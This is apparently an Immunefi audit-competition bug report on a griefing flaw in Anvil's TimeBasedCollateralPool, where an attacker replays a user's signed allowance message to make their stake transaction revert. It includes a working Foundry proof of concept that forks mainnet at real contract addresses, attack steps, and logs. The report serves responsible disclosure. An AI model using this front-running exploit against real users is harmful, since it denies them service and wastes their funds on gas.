# #36303 \[SC-Medium] attackers can cause griefing attack to cause stake transactions of timebasedcolla

## #36303 \[SC-Medium] Attackers can cause griefing attack to cause stake transactions of TimeBasedCollateralPool of users to always revert by front-running the user transaction to make the provided si...

**Submitted on Oct 28th 2024 at 15:29:49 UTC by @perseverance for** [**Audit Comp | Anvil**](https://immunefi.com/audit-competition/audit-comp-anvil)

* **Report ID:** #36303
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://etherscan.io/address/0xd042C267758eDDf34B481E1F539d637e41db3e5a>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

### Description

## Description

### Brief/Intro

The users can stake into the TimeBasedCollateralPool by using the function stake

\`\`\`solidity /\*\* \* @inheritdoc ITimeBasedCollateralPool \*/ function stake( IERC20 \_token, uint256 \_amount, bytes calldata \_collateralizableApprovalSignature ) external withEligibleAccountTokensReleased(msg.sender, address(\_token)) returns (uint256) { if (\_collateralizableApprovalSignature.length > 0) { collateral.modifyCollateralizableTokenAllowanceWithSignature( msg.sender, address(this), address(\_token), Pricing.safeCastToInt256(\_amount), \_collateralizableApprovalSignature ); }

```
    return _stake(_token, _amount);
}
```

\`\`\`

To trigger the \_stake action, the collateralizable contract must have been granted a non-zero allowance by the user. The user can provide a signed message to increase the corresponding allowance and thus make the whole transaction possible.

If the signature is provided, then collateral.modifyCollateralizableTokenAllowanceWithSignature is called to check the signature.

### The vulnerability

#### Vulnerability Details

An attacker may front-run a stake transaction containing a signed message and make it fail/revert.

The attacker front-runs the user's transaction and uses the signature to call modifyCollateralizableTokenAllowanceWithSignature successfully. The user's stake call fails because the signed message has already been used, thereby increasing the nonce.

This is possible because the function modifyCollateralizableTokenAllowanceWithSignature allows anyone to call.

\`\`\`solidity function modifyCollateralizableTokenAllowanceWithSignature( address \_accountAddress, address \_collateralizableContractAddress, address \_tokenAddress, int256 \_allowanceAdjustment, bytes calldata \_signature ) external { if (\_allowanceAdjustment > 0 && !collateralizableContracts\[\_collateralizableContractAddress]) revert ContractNotApprovedByProtocol(\_collateralizableContractAddress);

```
    _modifyCollateralizableTokenAllowanceWithSignature(
        _accountAddress,
        _collateralizableContractAddress,
        _tokenAddress,
        _allowanceAdjustment,
        _signature
    );
}
```

\`\`\`

## Impacts

## About the severity assessment

By this attack, the attacker cause user's stake transactions always revert. This does not bring financial benefit to the attacker, but cause damage to the users and the protocol. The damage is the user's gas for failed transactions and Denial of Service and bad user experience. The damage for the protocol is bad user experience.

Bug Severity: Medium

Impact category: Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

Difficulty of the attack: Easy

It is easy to automate the attack

### Link to Proof of Concept

<https://gist.github.com/Perseverancesuccess2021/5dd1ab799db0034872a7a436614092b8#file-testtimebasedcollateralpool-sol>

### Proof of Concept

## Proof of concept

Steps to execute the attack:

Step 1: Victim call the stake function and provide the signature in the transaction

Step 2: Attacker monitors the mempool and front-run the user transaction by calling CollateralVault\_contract.modifyCollateralizableTokenAllowanceWithSignature

So the user's transaction will revert

Test code to show: \`\`\`solidity function testStake() public {

```
    uint256 amount &#x3D; 100*10**6; 

    bytes memory signature &#x3D; CreateSignature();
   
    vm.startPrank(victim);
    console.log(&quot;Victim stake to TimeBasedCollateralPool&quot;);
    TimeBasedCollateralPool(TimeBasedCollateralPool_contract).stake(IERC20(USDC), amount, signature); 
    vm.stopPrank(); 
   
} 

function testStake_hacked() public {       
   
    uint256 amount &#x3D; 100*10**6;         
    bytes memory signature &#x3D; CreateSignature();
    console.log(&quot;Attacker front-run the victim by calling modifyCollateralizableTokenAllowanceWithSignature of CollateralVault_contract&quot;);
    uint256 _allowanceAdjustment &#x3D; 100*10**6; 
    
    CollateralVault(CollateralVault_contract).modifyCollateralizableTokenAllowanceWithSignature(victim, TimeBasedCollateralPool_contract, USDC, int256(_allowanceAdjustment), signature);

    testStake();         
   
}  
```

\`\`\`

Explanation:

The test case testStake() demonstrates the normal use-case when the victim call stake function to stake to the TimeBasedCollateralPool. This test case passes.

But in the testStake\_hacked(), the attacker front-run the victim's transaction by calling modifyCollateralizableTokenAllowanceWithSignature. Then the victim's transaction reverts.

Test Logs: Log file:

<https://gist.github.com/Perseverancesuccess2021/5dd1ab799db0034872a7a436614092b8#file-teststake\\_241028\\_2120-log>

\`\`\`Log No files changed, compilation skipped

Ran 2 tests for test/testTimeBasedCollateralPool.sol:testTimeBasedCollateralPool \[PASS] testStake() (gas: 311392) Logs: Setup Precondition for the test case Deploying TimeBasedCollateralPool Proxy contract that is VisibleBeaconProxy points to TimeBasedCollateralPool\_beacon Initialize TimeBasedCollateralPool contract Approve the TimeBasedCollateralPool\_contract as the collateralizable contract Balance of USDC before depositing: 10000000000 Approve the CollateralVault\_contract to spend USDC to deposit USDC Step: Deposit USDC to CollateralVault for the victim Victim stake to TimeBasedCollateralPool

\[FAIL. Reason: InvalidSignature(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)] testStake\_hacked() (gas: 123221) Logs: Setup Precondition for the test case Deploying TimeBasedCollateralPool Proxy contract that is VisibleBeaconProxy points to TimeBasedCollateralPool\_beacon Initialize TimeBasedCollateralPool contract Approve the TimeBasedCollateralPool\_contract as the collateralizable contract Balance of USDC before depositing: 10000000000 Approve the CollateralVault\_contract to spend USDC to deposit USDC Step: Deposit USDC to CollateralVault for the victim Attacker front-run the victim by calling modifyCollateralizableTokenAllowanceWithSignature of CollateralVault\_contract Victim stake to TimeBasedCollateralPool

Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 298.62ms (2.69ms CPU time)

Ran 1 test suite in 306.36ms (298.62ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests: Encountered 1 failing test in test/testTimeBasedCollateralPool.sol:testTimeBasedCollateralPool \[FAIL. Reason: InvalidSignature(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)] testStake\_hacked() (gas: 123221)

Encountered a total of 1 failing tests, 1 tests succeeded

\`\`\`

Full POC:

<https://gist.github.com/Perseverancesuccess2021/5dd1ab799db0034872a7a436614092b8#file-testtimebasedcollateralpool-sol>

\`\`\`solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0;

import "forge-std/Test.sol"; import "forge-std/console.sol"; import "../src/TimeBasedCollateralPool.sol"; import "../src/CollateralVault.sol"; import "../src/VisibleBeaconProxy.sol"; import "@openzeppelin/contracts/utils/cryptography/EIP712.sol"; import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract testTimeBasedCollateralPool is Test {

```
address USDC &#x3D; 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; 
address CollateralVault_contract &#x3D; 0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f; 
address TimeBasedCollateralPool_contract &#x3D; 0xd042C267758eDDf34B481E1F539d637e41db3e5a; 
address TimeBasedCollateralPool_beacon &#x3D; 0x1f00D6f7C18a8edf4f8Bb4Ead8a898aBDd9c9E14; 
address Owner &#x3D; address(0x11223344); 
address CollateralVault_owner &#x3D;  0x4eeB7c5BB75Fc0DBEa4826BF568FD577f62cad21; 
address Alice &#x3D; address(0x112233); 
address Attacker &#x3D; address(this);
address public victim;
uint256 public VictimPrivateKey; 

function setUp() public {
    vm.createSelectFork(&quot;https://rpc.ankr.com/eth&quot;, 21064787); // Oct-28-2024 02:40:23 PM +UTC
    VictimPrivateKey &#x3D; 0xa11ce; // This is just a sample, not important 
    victim &#x3D; vm.addr(VictimPrivateKey);
    deal(USDC,victim, 10000*10**6); 
    setup_precondition(); 
    
}

function deployContract() public {
    console.log(&quot;Deploying TimeBasedCollateralPool Proxy contract that is VisibleBeaconProxy points to TimeBasedCollateralPool_beacon&quot;);
    bytes memory data &#x3D; &quot;&quot;; 
    TimeBasedCollateralPool_contract  &#x3D;  address(new VisibleBeaconProxy(TimeBasedCollateralPool_beacon,data));
    
}

function initialize() public {
    console.log(&quot;Initialize TimeBasedCollateralPool contract&quot;);
    TimeBasedCollateralPool(TimeBasedCollateralPool_contract).initialize(CollateralVault(CollateralVault_contract), 1, Owner, Owner, Owner, Owner, Owner); 
}

function setup_precondition() public {
    
    console.log(&quot;Setup Precondition for the test case&quot;);
    deployContract();       
    initialize(); 
    console.log(&quot;Approve the TimeBasedCollateralPool_contract as the collateralizable contract&quot;);
    CollateralVault.CollateralizableContractApprovalConfig[] memory _collateralizableContractApprovals &#x3D; new CollateralVault.CollateralizableContractApprovalConfig[](1);
    _collateralizableContractApprovals[0] &#x3D; CollateralVault.CollateralizableContractApprovalConfig(TimeBasedCollateralPool_contract, true);
    vm.startPrank(CollateralVault_owner);
    CollateralVault(CollateralVault_contract).upsertCollateralizableContractApprovals(_collateralizableContractApprovals);
    vm.stopPrank(); 
    depositToCollateralVault(); 

} 

function depositToCollateralVault() public {
    vm.startPrank(victim); 
    console.log(&quot;Balance of USDC before depositing: &quot;,IERC20(USDC).balanceOf(victim));
    console.log(&quot;Approve the CollateralVault_contract to spend USDC to deposit USDC&quot;);
    IERC20(USDC).approve(CollateralVault_contract, 10000*10**6); 

    address[] memory _tokenAddresses &#x3D; new address[](1);
    _tokenAddresses[0] &#x3D; USDC;
    uint256[] memory _amounts &#x3D; new uint256[](1);
    _amounts[0] &#x3D; 10000*10**6; 
    console.log(&quot;Step: Deposit USDC to CollateralVault for the victim&quot;);
    CollateralVault(CollateralVault_contract).depositToAccount(victim, _tokenAddresses, _amounts);
    vm.stopPrank();

}

bytes32 public constant COLLATERALIZABLE_TOKEN_ALLOWANCE_ADJUSTMENT_TYPEHASH &#x3D;
    keccak256(
        &quot;CollateralizableTokenAllowanceAdjustment(address collateralizableAddress,address tokenAddress,int256 allowanceAdjustment,uint256 approverNonce)&quot;
    );

bytes32 private constant TYPE_HASH &#x3D;
    keccak256(&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;);

function CreateSignature() public returns ( bytes memory signature){
    
    address _collateralizableContractAddress &#x3D; TimeBasedCollateralPool_contract; 
    uint256 _allowanceAdjustment &#x3D; 100*10**6; 
    (, string memory name, string memory  version, , , ,   ) &#x3D; CollateralVault(CollateralVault_contract).eip712Domain(); 
    
    bytes32 _buildDomainSeparator &#x3D; keccak256(abi.encode(TYPE_HASH, keccak256(bytes(name)),  keccak256(bytes(version)), block.chainid, CollateralVault_contract));

    bytes32 structHash &#x3D; keccak256(
        abi.encode(
            COLLATERALIZABLE_TOKEN_ALLOWANCE_ADJUSTMENT_TYPEHASH,
            _collateralizableContractAddress,
            USDC,
            _allowanceAdjustment,
            0
        )
    ); 

    bytes32 message &#x3D; MessageHashUtils.toTypedDataHash(_buildDomainSeparator, structHash); 

    (uint8 v, bytes32 r, bytes32 s) &#x3D; vm.sign(VictimPrivateKey, message); 

   signature &#x3D; abi.encodePacked(r, s, v);

}

// forge test --match-test testStake -vvvvv | format &gt; testStake_241028_2120.log
function testStake() public {        
  
    console.log(&quot;Step : Another user Deposit to TimeBasedCollateralPool&quot;);

    uint256 amount &#x3D; 100*10**6; 

    bytes memory signature &#x3D; CreateSignature();
   
    vm.startPrank(victim);
    console.log(&quot;Victim stake to TimeBasedCollateralPool&quot;);
    TimeBasedCollateralPool(TimeBasedCollateralPool_contract).stake(IERC20(USDC), amount, signature); 
    vm.stopPrank(); 
   
} 

function testStake_hacked() public {       
   
    console.log(&quot;Step : Another user Deposit to TimeBasedCollateralPool&quot;);
    uint256 amount &#x3D; 100*10**6;         
    bytes memory signature &#x3D; CreateSignature();
    console.log(&quot;Attacker front-run the victim by calling modifyCollateralizableTokenAllowanceWithSignature of CollateralVault_contract&quot;);
    uint256 _allowanceAdjustment &#x3D; 100*10**6; 
    
    CollateralVault(CollateralVault_contract).modifyCollateralizableTokenAllowanceWithSignature(victim, TimeBasedCollateralPool_contract, USDC, int256(_allowanceAdjustment), signature);

    testStake();         
   
}        
```

} \`\`\`

Just download the zip file:

<https://drive.google.com/file/d/1u6GpvBXKcHu\\_OBxBmMPtw-d2EirSsKtw/view?usp=sharing>

The test code uses Foundry. Just Unzip and run the test case:

\`\`\`bash forge test --match-test testStake -vvvvv > testStake\_241028\_2120.log

\`\`\`
